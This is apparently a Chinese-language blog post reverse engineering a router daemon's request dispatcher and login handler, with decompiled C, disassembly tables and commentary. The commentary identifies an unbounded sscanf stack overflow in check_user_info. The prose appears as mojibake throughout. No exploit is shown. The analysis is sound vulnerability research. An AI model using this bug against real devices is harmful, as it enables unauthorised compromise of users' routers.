<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *__fastcall <span class="title function_">do_handler</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  _DWORD **v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> *result; <span class="comment">// r0</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> (__fastcall *v13)(_DWORD *, <span class="type">int</span>); <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r0</span></span><br><span class="line">  _DWORD *v15; <span class="comment">// r0</span></span><br><span class="line">  _DWORD *v16; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v17; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v19; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v20; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v21; <span class="comment">// [sp+0h] [bp-28h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v22; <span class="comment">// [sp+4h] [bp-24h]</span></span><br><span class="line"></span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v1 = a1;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 || *a1 &lt; <span class="number">0</span> || (v2 = a1[<span class="number">6</span>]) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2487</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Invalid params.&quot;</span>);</span><br><span class="line">LABEL_27:</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = jso_next_sub_obj(v2, <span class="number">0</span>, &amp;v21);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = get_module_root_const();</span><br><span class="line">    v6 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = jso_new_obj(v5);</span><br><span class="line">      v1[<span class="number">7</span>] = v8;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( jso_is_obj(*v3) != <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">          result = jso_next_sub_obj(v1[<span class="number">6</span>], v3, &amp;v21);</span><br><span class="line">          v3 = result;</span><br><span class="line">          <span class="keyword">if</span> ( !result )</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = get_module_node(v6, v21);</span><br><span class="line">        <span class="keyword">if</span> ( v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = *v3;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = v16 )</span><br><span class="line">          &#123;</span><br><span class="line">            v15 = jso_next_sub_obj(v11, i, &amp;v22);</span><br><span class="line">            v16 = v15;</span><br><span class="line">            <span class="keyword">if</span> ( !v15 )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">            v17 = v22;</span><br><span class="line">            v18 = *v15;</span><br><span class="line">            <span class="keyword">if</span> ( !v22 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v19 = get_ds_node(v10, v22, <span class="number">2u</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;do_keyword_action&quot;</span>, <span class="number">2284</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Service %s not support.&quot;</span>, v17);</span><br><span class="line">              <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">              v20 = <span class="number">-40106</span>;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">            &#125;</span><br><span class="line">            v13 = *(v19 + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v13 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;do_keyword_action&quot;</span>, <span class="number">2297</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Function keyword_action is NULL.&quot;</span>);</span><br><span class="line">              <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">              v20 = <span class="number">-40101</span>;</span><br><span class="line">LABEL_31:</span><br><span class="line">              v1[<span class="number">5</span>] = v20;</span><br><span class="line">LABEL_26:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2536</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Run %s service failed&quot;</span>, v22);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">            &#125;</span><br><span class="line">            v14 = v13(v1, v18);                 <span class="comment">// è°ƒç”¨å¯¹åº”çš„å‡½æ•°</span></span><br><span class="line">            v1[<span class="number">5</span>] = v14;</span><br><span class="line">            <span class="keyword">if</span> ( v14 )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">            v11 = *v3;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;do_keyword_action&quot;</span>, <span class="number">2277</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Invalid params.&quot;</span>);</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2525</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Module %s not support.&quot;</span>, v21);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        v4 = <span class="number">-40106</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2512</span>);</span><br><span class="line">      v7 = <span class="string">&quot;Create new json object failed.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2503</span>);</span><br><span class="line">      v7 = <span class="string">&quot;Get model root node failed.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(v7);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    v4 = <span class="number">-40101</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2495</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Request signal is illegal.&quot;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    v4 = <span class="number">-40209</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  v1[<span class="number">5</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ 93 è¡Œé™„è¿‘ä½¿ç”¨äº†åŠ¨æ€çš„å‡½æ•°æŒ‡é’ˆè°ƒç”¨ä¸åŒå‡½æ•°ï¼Œé™æ€åˆ†æä¸­æš‚æ—¶æ— æ³•å®šä½å…·ä½“çš„å‡½æ•°åˆ—è¡¨ã€‚</p>
<p>ç”±äºæ‰‹ä¸­æœ‰çœŸå®è®¾å¤‡ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æŠ“åŒ…çš„æ–¹å¼è·å¾—ä¸€äº›åŠŸèƒ½æ¥å£ï¼Œé€šè¿‡å­—ç¬¦ä¸²æœç´¢å‘ç°äº†ç–‘ä¼¼çš„å‡½æ•°å‚ç…§è¡¨ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00045EC0 dword_45EC0     DCD 0                   ; DATA XREF: sub_25F4Câ†‘o</span><br><span class="line">.data:00045EC0                                         ; .text:off_25F54â†‘o</span><br><span class="line">.data:00045EC4                 DCD 0</span><br><span class="line">.data:00045EC8                 DCD 0x2A62C</span><br><span class="line">.data:00045ECC                 DCD 0x2A62C</span><br><span class="line">.data:00045ED0                 DCD 0x45F44</span><br><span class="line">.data:00045ED4                 DCD 0</span><br><span class="line">.data:00045ED8                 DCD 0x45EDC</span><br><span class="line">.data:00045EDC                 DCD 0x30BD0</span><br><span class="line">.data:00045EE0                 DCD 0x25CAD</span><br><span class="line">.data:00045EE4                 DCD 0x30BE1</span><br><span class="line">.data:00045EE8                 DCD 0x256C1</span><br><span class="line">.data:00045EEC                 DCD 0x30BF2</span><br><span class="line">.data:00045EF0                 DCD 0x2575D</span><br><span class="line">.data:00045EF4                 DCD 0</span><br><span class="line">.data:00045EF8                 DCD 0</span><br><span class="line">.data:00045EFC                 DCD 0x2A65A</span><br><span class="line">.data:00045F00                 DCD 0xA00</span><br><span class="line">.data:00045F04                 DCD 0x45FC4</span><br><span class="line">.data:00045F08                 DCD 0</span><br><span class="line">.data:00045F0C                 DCD 0x25B19</span><br><span class="line">.data:00045F10                 DCD 0x253F9</span><br><span class="line">.data:00045F14                 DCD 0x30B00</span><br><span class="line">.data:00045F18                 DCD 0xA00</span><br><span class="line">.data:00045F1C                 DCD 0x45FC4</span><br><span class="line">.data:00045F20                 DCD 0</span><br><span class="line">.data:00045F24                 DCD 0x25B19</span><br><span class="line">.data:00045F28                 DCD 0x25455</span><br><span class="line">.data:00045F2C                 DCD 0</span><br><span class="line">.data:00045F30                 DCD 0</span><br><span class="line">.data:00045F34                 DCD 0</span><br><span class="line">.data:00045F38                 DCD 0</span><br><span class="line">.data:00045F3C                 DCD 0</span><br><span class="line">.data:00045F40                 DCD 0</span><br></pre></td></tr></table></figure></div>

<p>IDA é»˜è®¤æ²¡æœ‰æŠŠè¿™é‡Œè¯†åˆ«æˆä»»ä½•çš„å˜é‡ï¼Œä½†æ˜¯ä» Ghidra ä¸­å¯»æ‰¾è¿™éƒ¨åˆ†æ•°æ®å¯ä»¥å¾—åˆ°ä»¥ä¸‹è§£æç»“æœï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">                     DAT_00045ec0                                    XREF[2]:     00025f4c (*) , 00025f54 (*)   </span><br><span class="line">00045ec0 00              ??         00h</span><br><span class="line">00045ec1 00              ??         00h</span><br><span class="line">00045ec2 00              ??         00h</span><br><span class="line">00045ec3 00              ??         00h</span><br><span class="line">00045ec4 00              ??         00h</span><br><span class="line">00045ec5 00              ??         00h</span><br><span class="line">00045ec6 00              ??         00h</span><br><span class="line">00045ec7 00              ??         00h</span><br><span class="line">00045ec8 2c  a6  02  00    addr       s_user_management_0002a62c                       = &quot;user_management&quot;</span><br><span class="line">00045ecc 2c  a6  02  00    addr       s_user_management_0002a62c                       = &quot;user_management&quot;</span><br><span class="line">00045ed0 44  5f  04  00    addr       PTR_DAT_00045f44                                 = 0002a63c</span><br><span class="line">00045ed4 00              ??         00h</span><br><span class="line">00045ed5 00              ??         00h</span><br><span class="line">00045ed6 00              ??         00h</span><br><span class="line">00045ed7 00              ??         00h</span><br><span class="line">00045ed8 dc  5e  04  00    addr       PTR_s_change_user_info_00045edc                  = 00030bd0</span><br><span class="line">                     PTR_s_change_user_info_00045edc                 XREF[1]:     00045ed8 (*)   </span><br><span class="line">00045edc d0  0b  03  00    addr       s_change_user_info_00030bd0                      = &quot;change_user_info&quot;</span><br><span class="line">00045ee0 ad  5c  02  00    addr       FUN_00025cac+1</span><br><span class="line">00045ee4 e1  0b  03  00    addr       s_get_encrypt_info_00030be1                      = &quot;get_encrypt_info&quot;</span><br><span class="line">00045ee8 c1  56  02  00    addr       FUN_000256c0+1</span><br><span class="line">00045eec f2  0b  03  00    addr       s_check_user_info_00030bf2                       = &quot;check_user_info&quot;</span><br><span class="line">00045ef0 5d  57  02  00    addr       FUN_0002575c+1</span><br><span class="line">00045ef4 00              ??         00h</span><br><span class="line">00045ef5 00              ??         00h</span><br><span class="line">00045ef6 00              ??         00h</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>è¿™æ®µæ•°æ®æ˜¯ å­—ç¬¦ä¸²ã€å‡½æ•°æŒ‡é’ˆã€å­—ç¬¦ä¸²ã€å‡½æ•°æŒ‡é’ˆ è¿™ç§å½¢å¼æ’åˆ—çš„ï¼Œå¤§æ¦‚åˆ†æä»¥ä¸‹å¯ä»¥å‘ç°æ¯ä¸ªå­—ç¬¦ä¸²ä¸‹æ–¹çš„å‡½æ•°å°±æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²å¯¹åº”çš„ handlerï¼Œä¾‹å¦‚ 0x45EDC  ä½ç½®çš„å­—ç¬¦ä¸²æ˜¯ change_user_infoï¼Œè€Œ 0x45EE0 ä½ç½®çš„å‡½æ•°æŒ‡é’ˆæ­£æ˜¯ change_user_info æ¥å£çš„ handlerã€‚</p>
<p>ç”±æ­¤æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªç›¸å¯¹æ¯”è¾ƒå®Œæ•´çš„è®¾å¤‡æ¥å£ handler åˆ—è¡¨ï¼Œæ¥ä¸‹æ¥çš„æ“ä½œå¯ä»¥æ˜¯æå–æ¥å£ç„¶åä¾æ¬¡åˆ†æã€‚</p>
<p>åœ¨ 0x45EEC ä½ç½®çš„å­—ç¬¦ä¸²æ˜¯ check_user_infoï¼Œå¯¹åº”çš„ handler ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> __fastcall <span class="title function_">do_login</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">size_t</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+0h] [bp-10h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+10h] [bp+0h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v16, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v15, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !jso_is_obj(v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  v5 = jso_obj_get_string_origin(v3, <span class="string">&quot;username&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  v6 = jso_obj_get_string_origin(v3, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  v7 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">  v8 = jso_obj_get_string_origin(v3, <span class="string">&quot;encrypt_type&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">    v7 = v8;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;check_user_info&quot;</span>, <span class="number">1016</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;encrypt_type:%s.&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;2&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = get_private_key();</span><br><span class="line">    v10 = <span class="built_in">strlen</span>(v6);</span><br><span class="line">    v11 = <span class="built_in">strlen</span>(v9);</span><br><span class="line">    v12 = private_decrypt(v6, v10, v9, v11);    <span class="comment">// è§£å¯†ç”¨æˆ·è¾“å…¥çš„å¯†ç </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;check_user_info&quot;</span>, <span class="number">1022</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;plaintext:%s.&quot;</span>, v12);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="built_in">sscanf</span>(v12, <span class="string">&quot;%[^:]:%[^:]&quot;</span>, &amp;v16, &amp;v15);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;check_user_info&quot;</span>, <span class="number">1026</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v13 == <span class="number">2</span> )</span><br><span class="line">        v6 = &amp;v16;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;hashPswd(%s)  rsa_nonce(%s).&quot;</span>, &amp;v16, &amp;v15);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">      <span class="built_in">free</span>(v12);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = sub_17406(v2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-40407</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_175B0(v2, v5, v6) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-40401</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;2&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">-40409</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_17B8C(&amp;v15) &gt;= <span class="number">0</span> )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä»é€»è¾‘ä¸Šæ¥çœ‹ï¼Œæ­¤å‡½æ•°æ˜¯ç”¨äºæ£€æŸ¥è´¦æˆ·ä¿¡æ¯çš„ï¼Œç”¨æˆ·å¯ä»¥ä¼ å…¥ username ä»¥åŠ passwordï¼Œå…¶ä¸­ password æ˜¯ç»è¿‡åŠ å¯†çš„ã€‚</p>
<p>å‡½æ•°æ¥å—åˆ° password ä¹‹åä¼šè°ƒç”¨ private_decrypt å¯¹ password è§£å¯†ï¼Œä»è§£å¯†å‡½æ•°åä¸Šæ¥çœ‹ password å¾ˆå¯èƒ½æ˜¯ç»è¿‡å…¬é’¥å¯†ç åŠ å¯†ï¼Œä¾‹å¦‚ RSAã€‚ç»è¿‡è§£å¯†çš„å­—ç¬¦ä¸²ä¼šè¢«å¸¦å…¥ sscanf å‡½æ•°æ‹·è´åˆ° stack æŸä¸ªå˜é‡ä¸­ã€‚</p>
<p>æ³¨æ„è¿™é‡Œçš„ sscanf æ ¼å¼åŒ–å­—ç¬¦ä¸²å¹¶æ²¡æœ‰é™åˆ¶æ‹·è´å­—èŠ‚çš„æ•°é‡ï¼Œè€ƒè™‘åˆ° RSA æœ€å¤§çš„æ˜æ–‡å¯ä»¥æ˜¯ 128 å­—èŠ‚ï¼Œä½†æ˜¯ sscanf çš„ç›®æ ‡ buffer (å¤§å°å¯åœ¨å¼€å¤´çš„ memset çœ‹åˆ°) åŠ èµ·æ¥åªæœ‰ 80 å­—èŠ‚ï¼Œè€Œä¸”æŸ¥çœ‹ IDA çš„å˜é‡å®šä¹‰å‘ç°ä¸¤ä¸ª buffer éƒ½é è¿‘æ ˆåº•ã€‚æ‰€ä»¥å¾ˆå¯èƒ½ä¼šå¯¼è‡´æº¢å‡ºã€‚</p>
<p>è‡³äºèƒ½å¦äº§ç”Ÿæº¢å‡ºï¼Œè¿˜è¦çœ‹ private_decrypt  å‡½æ•°çš„å…·ä½“å®ç°é€»è¾‘ï¼Œç»è¿‡æœç´¢å‘ç°æ­¤å‡½æ•°æ˜¯ &#x2F;usr&#x2F;lib&#x2F;libdecrypter.so åº“å¯¼å‡ºçš„ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">private_decrypt</span><span class="params">(<span class="type">int</span> a1, <span class="type">signed</span> <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v11; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">void</span> *v12; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+8h] [bp-4h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [sp+Ch] [bp+0h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [sp+10h] [bp+4h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [sp+88h] [bp+7Ch]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [sp+108h] [bp+FCh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [sp+190h] [bp+184h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">172</span> || !a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = a2;</span><br><span class="line">    v8 = <span class="string">&quot;wrong input. ciphertext_len %d.\n&quot;</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">    msglog(<span class="number">5</span>, <span class="string">&quot;DECRYPTER&quot;</span>, v8, v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">1024</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !j_rsa_base64_decode(a3, a4, &amp;v18, &amp;v13) )</span><br><span class="line">  &#123;</span><br><span class="line">    msglog(<span class="number">5</span>, <span class="string">&quot;DECRYPTER&quot;</span>, <span class="string">&quot;Base64 decode private key error.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  InitRsaKey(&amp;v17, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( RsaPrivateKeyDecode(&amp;v18, &amp;v14, &amp;v17, v13) )</span><br><span class="line">  &#123;</span><br><span class="line">    msglog(<span class="number">5</span>, <span class="string">&quot;DECRYPTER&quot;</span>, <span class="string">&quot;Private key decode error: %d \n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">128</span>;</span><br><span class="line">    v4 = j_rsa_base64_decode(v5, v6, &amp;v16, &amp;v13);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = RsaPrivateDecrypt(&amp;v16, v13, &amp;v15, <span class="number">117</span>, &amp;v17);</span><br><span class="line">      <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v11;</span><br><span class="line">        v8 = <span class="string">&quot;Decrypt ciphtertext error. ret %d\n&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      &#125;</span><br><span class="line">      v12 = <span class="built_in">calloc</span>(<span class="number">0x75</span>u, <span class="number">1u</span>);</span><br><span class="line">      v4 = (<span class="type">int</span>)v12;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(v12, &amp;v15, v11);</span><br><span class="line">        *(_BYTE *)(v4 + v11) = <span class="number">0</span>;</span><br><span class="line">        FreeRsaKey(&amp;v17);</span><br><span class="line">        <span class="keyword">return</span> v4;</span><br><span class="line">      &#125;</span><br><span class="line">      v10 = <span class="string">&quot;Calloc mem error.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="string">&quot;Base64 decode ciphtertext error.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">signed</span> <span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *))msglog)(<span class="number">5</span>, <span class="string">&quot;DECRYPTER&quot;</span>, v10);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç®€å•åˆ†æå‘ç°æ­¤å‡½æ•°ç¡®å®æ˜¯ RSA ç®—æ³•çš„è§£å¯†å‡½æ•°ï¼Œå¹¶ä¸”å†…éƒ¨é™åˆ¶äº†æ˜æ–‡çš„é•¿åº¦ä¸º 128 å­—èŠ‚ã€‚</p>
